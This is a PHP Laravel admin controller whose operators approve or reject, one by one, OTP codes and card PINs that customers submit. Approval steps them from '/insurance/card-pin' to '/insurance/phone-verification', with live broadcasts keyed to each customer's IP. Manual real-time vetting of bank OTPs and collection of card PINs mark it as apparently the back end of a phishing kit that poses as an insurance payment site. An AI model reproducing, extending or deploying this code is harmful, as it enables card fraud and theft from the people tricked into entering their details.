<?php

namespace App\Http\Controllers\Admin;

use App\Events\OtpApproved;
use App\Events\OtpRejected;
use App\Events\PinApproved;
use App\Events\PinRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

class AdminOtpController extends Controller
{
    use NotifiesDashboard;

    /**
     * Approve an OTP
     */
    public function approve(int $id, Request $request): JsonResponse
    {
        // Atomic check-then-update to prevent race conditions
        [$otp, $earlyResponse] = DB::transaction(function () use ($id) {
            $otp = OtpCode::lockForUpdate()->findOrFail($id);

            if ($otp->status !== 'pending') {
                return [$otp, response()->json([
                    'success' => false,
                    'message' => 'هذا الرمز تم معالجته مسبقاً',
                ], 422)];
            }

            if ($otp->isExpired()) {
                $otp->reject('otp_expired');
                return [$otp, response()->json([
                    'success' => false,
                    'message' => 'انتهت صلاحية رمز التحقق',
                    'expired' => true,
                ], 422)];
            }

            $otp->verify();

            // Reset fail count on successful approval
            if ($otp->customer) {
                $updateData = [
                    'otp_fail_count'   => 0,
                    'otp_locked_until' => null,
                ];
                if ($otp->type === 'otp') {
                    $updateData['current_page'] = '/insurance/card-pin';
                } elseif ($otp->type === 'pin') {
                    $updateData['current_page'] = '/insurance/phone-verification';
                }
                $otp->customer->update($updateData);
            }

            return [$otp, null];
        });

        if ($earlyResponse) {
            return $earlyResponse;
        }

        $customerIp = $otp->customer?->ip_address ?? '';
        $sessionId  = $otp->session_id;

        if (empty($customerIp)) {
            Log::error("approveOtp: No customer IP for OTP #{$id}");
        }

        $customerId = $otp->customer?->id;

        // Flush cache BEFORE broadcast so other admins get fresh data immediately
        $this->flushCustomerCache();

        try {
            if ($otp->type === 'otp') {
                broadcast(new OtpApproved($customerIp, null, $sessionId, $customerId))->toOthers();
            } elseif ($otp->type === 'pin') {
                broadcast(new PinApproved($customerIp, null, $sessionId, $customerId))->toOthers();
            }
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (approveOtp): ' . $e->getMessage());
        }

        $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_approved' : 'otp_approved');
        $this->refreshPaymentViewed($customerIp);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على رمز OTP بنجاح',
        ]);
    }

    /**
     * Reject an OTP
     */
    public function reject(int $id, Request $request): JsonResponse
    {
        $request->validate([
            'reason' => 'nullable|string|max:500',
        ]);

        $reason = $request->input('reason');

        // Atomic check-then-update — same pattern as approve() to prevent race on otp_fail_count
        [$otp, $earlyResponse] = DB::transaction(function () use ($id, $reason) {
            $otp = OtpCode::lockForUpdate()->findOrFail($id);

            if ($otp->status !== 'pending') {
                return [$otp, response()->json([
                    'success' => false,
                    'message' => 'هذا الرمز تم معالجته مسبقاً',
                ], 422)];
            }

            $otp->reject($reason);

            // Increment fail count + lockout after 10 consecutive failures
            if ($otp->customer) {
                $fails = $otp->customer->otp_fail_count + 1;
                $lockUntil = $fails >= 10 ? now()->addMinutes(10) : null;
                $otp->customer->update([
                    'otp_fail_count'   => $fails,
                    'otp_locked_until' => $lockUntil,
                ]);
            }

            return [$otp, null];
        });

        if ($earlyResponse) {
            return $earlyResponse;
        }

        $customerIp = $otp->customer?->ip_address ?? '';
        $customerId = $otp->customer?->id;
        $sessionId  = $otp->session_id;

        // Flush cache BEFORE broadcast so other admins get fresh data immediately
        $this->flushCustomerCache();

        try {
            if ($otp->type === 'otp') {
                broadcast(new OtpRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
            } elseif ($otp->type === 'pin') {
                broadcast(new PinRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
            }
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (rejectOtp): ' . $e->getMessage());
        }

        $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_rejected' : 'otp_rejected');
        $this->refreshPaymentViewed($customerIp);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض رمز OTP',
        ]);
    }
}
